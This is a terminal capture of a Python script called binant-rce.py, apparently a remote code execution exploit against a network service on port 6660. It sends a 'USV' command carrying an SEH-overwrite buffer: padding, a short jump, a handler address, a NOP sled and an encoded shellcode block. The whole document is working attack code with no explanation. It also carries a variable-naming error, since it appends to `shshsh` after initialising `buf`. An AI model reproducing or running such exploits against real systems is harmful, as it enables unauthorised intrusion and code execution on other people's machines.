c@kali:~/src/binga$ cat binant-rce.py
#!/usr/bin/env python
import sys, socket
target = sys.argv[1]
port = 6660

buf =  ""
shshsh += "\xbb\xb5\x98\xba\xbe\xd9\xea\xd9\x74\x24\xf4\x5a\x29"
shshsh += "\xc9\xb1\x54\x83\xc2\x04\x31\x5a\x0f\x03\x5a\xba\x7a"
shshsh += "\x4f\x42\x2c\xf8\xb0\xbb\xac\x9d\x39\x5e\x9d\x9d\x5e"
shshsh += "\x2a\x8d\x2d\x14\x7e\x21\xc5\x78\x6b\xb2\xab\x54\x9c"
shshsh += "\x73\x01\x83\x93\x84\x3a\xf7\xb2\x06\x41\x24\x15\x37"
shshsh += "\x8a\x39\x54\x70\xf7\xb0\x04\x29\x73\x66\xb9\x5e\xc9"
shshsh += "\xbb\x32\x2c\xdf\xbb\xa7\xe4\xde\xea\x79\x7f\xb9\x2c"
shshsh += "\x7b\xac\xb1\x64\x63\xb1\xfc\x3f\x18\x01\x8a\xc1\xc8"
shshsh += "\x58\x73\x6d\x35\x55\x86\x6f\x71\x51\x79\x1a\x8b\xa2"
shshsh += "\x04\x1d\x48\xd9\xd2\xa8\x4b\x79\x90\x0b\xb0\x78\x75"
shshsh += "\xcd\x33\x76\x32\x99\x1c\x9a\xc5\x4e\x17\xa6\x4e\x71"
shshsh += "\xf8\x2f\x14\x56\xdc\x74\xce\xf7\x45\xd0\xa1\x08\x95"
shshsh += "\xbb\x1e\xad\xdd\x51\x4a\xdc\xbf\x3d\xbf\xed\x3f\xbd"
shshsh += "\xd7\x66\x33\x8f\x78\xdd\xdb\xa3\xf1\xfb\x1c\xc4\x2b"
shshsh += "\xbb\xb3\x3b\xd4\xbc\x9a\xff\x80\xec\xb4\xd6\xa8\x66"
shshsh += "\x45\xd7\x7c\x12\x4f\x4f\xbf\x4b\x4d\xbb\x57\x8e\x52"
shshsh += "\xd2\xfb\x07\xb4\x84\x53\x48\x69\x64\x04\x28\xd9\x0c"
shshsh += "\x4e\xa7\x06\x2c\x71\x6d\x2f\xc6\x9e\xd8\x07\x7e\x06"
shshsh += "\x41\xd3\x1f\xc7\x5f\x99\x1f\x43\x6a\x5d\xd1\xa4\x1f"
shshsh += "\x4d\x05\xd5\xdf\x8d\xd5\x7c\xe0\xe7\xd1\xd6\xb7\x9f"
shshsh += "\xdb\x0f\xff\x3f\x24\x7a\x83\x38\xda\xfb\xb2\x33\xec"
shshsh += "\x69\xfb\x2b\x10\x7e\xfb\xab\x46\x14\xfb\xc3\x3e\x4c"
shshsh += "\xa8\xf6\x41\x59\xdc\xaa\xd7\x62\xb5\x1f\x70\x0b\x3b"
shshsh += "\x79\xb6\x94\xc4\xac\xc5\xd3\x3b\x32\xeb\x7b\x54\xcc"
shshsh += "\xab\x7b\xa4\xa6\x2b\x2c\xcc\x3d\x04\xc3\x3c\xbd\x8f"
shshsh += "\x8c\x54\x34\x41\x7e\xc4\x49\x48\xde\x58\x49\x7e\xfb"
shshsh += "\x8d\xc4\x81\xfc\xb1\x26\xbe\x2a\x88\x5c\x87\xee\xaf"
shshsh += "\x6f\xb2\x53\x99\xe5\xbc\xc0\xd9\x2f"
print len(shshsh)


# buff = "szatan" + "nseh" + "menele" + "raperzy" + "twamuszelka" + "shum;];];]"
buff = 'A' * 962 + "\xeb\x07\x90\x90" + "\xa9\x50\x82\x1b" + '\x90'*16 + shshsh + 'D'*1170
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((target,port))
# Send in a string 'USV ' + the string 'buff'
s.send('USV ' + buff + '\r\n\r\n')
s.close()
c@kali:~/src/binga$
